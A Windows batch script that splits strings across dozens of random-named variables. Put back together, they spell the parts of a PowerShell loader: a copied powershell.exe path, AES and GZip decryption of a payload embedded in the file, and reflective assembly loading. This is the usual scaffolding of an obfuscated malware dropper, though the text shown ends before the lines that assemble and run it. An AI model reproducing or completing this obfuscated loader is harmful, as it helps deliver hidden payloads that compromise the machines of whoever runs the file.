@echo off
set "KssKoOPNFQ=ll"
set "ClVJzGnSAv=we"
set "TFxitinJCC=nd"
set "BsWfNxhcLV=co"
set "JZlaDrvIoA=rs"
set "ZoXasFXwjm=Po"
set "BrqyaoHUij=we"
set "UdezjTeQBF=1."
set "TyGhafyUKX=ow"
set "nTdPzPVLSt=0\"
set "mvdiRXPsXn=\W"
set "faOpxMrzLc=Wi"
set "hBlIwvowWC=xe"
set "wJfvqaUgdZ=py"
set "DyUMIPAnvJ=32"
set "KtenClDIvE= C"
set "cHmzXvaOQt=he"
set "fJoFFGtHps=st"
set "tbsvYMWAPq=y "
set "JFHpccXuqS=ll"
set "CdkwJvMoXi=.e"
set "howhhkLUrK=rS"
set "qXAxCwojXW=in"
set "nwPOvPHUoI=em"
set "SJTUMdrVYA= /"
set "uYoBzDkzjl=po"
set "PgXzMWODZG=he"
set "VqlkKttQiz=:\"
set "kzxNqLSPSh=\v"
set "ffmFfStGWy=ws"
set "TeXtLqScRC=Sy"
set "GdYDUKEPPQ=s\"
set "JYOiZHPBWP=do"
set "PYJXBEtDhT= %~dp0"
set "URtGOhTfXM=cd"
set "wsPQtWfclK=ddin"
set "huWBYHPhoI= = ["
set "VDsqXgXfAs=dAlT"
set "nSjzmWdQmL=$qRc"
set "hlZcToTEBB=ck($"
set "IMYqyknuYd=nage"
set "HCUpQqVMNq=ew-O"
set "SdWvNRQHPG=gsYZ"
set "wBLDyvPcZl=pose"
set "dRmIZfyFkO=LAie"
set "MvQPumZsBa=ect "
set "SvfFSnLyTo=y.Pa"
set "FXsSLRliNo=TqgY"
set "kVLjzSaYDm=y.Ci"
set "OoYzNGvgrA=Kys."
set "jUadHdcSkN=-nop"
set "aefGSmhBPC= '')"
set "GIDMhhHPRq=$mdA"
set "mgZGaZkoXN=.Ass"
set "FPBplsHBaw=bjec"
set "mAyMUfBOdo=oint"
set "KRLsJdLLQO=onve"
set "fatytbxagX=Bmor"
set "vmOQjzNcNV=m = "
set "FsdWsrUMvp=Disp"
set "aeeQFNoHth=pher"
set "DRQjQgpnuX=('%*'"
set "KkKYDFRBjI=yste"
set "SgbKwmXesQ= = N"
set "TjTuhEUSzS=k; }"
set "YSnTrfHHIY=-4] "
set "YqLswmlRHJ=rtS4"
set "xInPvlKcLQ=TqgY"
set "GEjmyVSXIS=  $W"
set "aIqROUMvHy=ddin"
set "QzihgUZKSG=ct S"
set "BwsuDSDJhs=;$HR"
set "mcxBLtOtPh=.-16"
set "ENMuzbSohc=uHd "
set "TMQsnAzeeP=F'[-"
set "OmIFdgiSnQ=dj0C"
set "HQCZcrfQze=.Dis"
set "xkBuVHuCsB=eam("
set "azPCcZVgCL=Fina"
set "pDSBhQzrip=[IO."
set "pRKgQXjgZH=zuZI"
set "wqsXUbYQCV=::De"
set "sURmDkWhiZ=l5E7"
set "kenaIjBHSl=106u"
set "EMoquGtlmE=($nd"
set "PYxeTLpJgL=mdAl"
set "VjcybWdHjt=S46e"
set "ptlKgAcoVT=);$M"
set "JIAUyCZbvT=.Mem"
set "dpLOeHlMhh=Disp"
set "mZflobYyae=-Obj"
set "HGYDjTdsdd=ispo"
set "gomUzXvVmo=ss -"
set "npmDapdkdX=yste"
set "ydNtRaWLIu=n ''"
set "EXRnCBrUYp=();$"
set "lLBnZQnIuL=join"
set "AXHvKFptdI=();$"
set "biiBNAtjDA=New-"
set "NtoxiJmIuh=V = "
set "LcXKCtcBGR=Aie."
set "eIHxYxoMoU=)) {"
set "ClzeRslMbn=le  "
set "XMubpZJaCo=tpm."
set "adPNQEsZOE=-1.."
set "dXpyFKGKmk=vxVc"
set "rIwVTAqpNs=stem"
set "WAHCIKHYdz=SBeD"
set "sVBvWpvLZd= New"
set "UTlUbqKGVd=:('g"
set "eLCgJKbiTY= [Sy"
set "IEUgDmnkmb=L4Yi"
set "SSsTisiaed=oArr"
set "EOoMFmKEqW=qWVX"
set "EEbmcKAvSr='txe"
set "TknUDSGGpX=raph"
set "JEMORcELzd=.Sec"
set "LnxXYGuuUP=]::("
set "rzKRqmMUEe=Stre"
set "ybFnggckZh=.Dis"
set "OkLKQwtRZZ=-joi"
set "XMdwwMTbdb=th('"
set "vRkURTWVDs='[-1"
set "wMmMrjAnTz=YxVw"
set "iSqWMFyDEm=rans"
set "nZRjjhxYHT=brea"
set "VHUdNIMfic=lit("
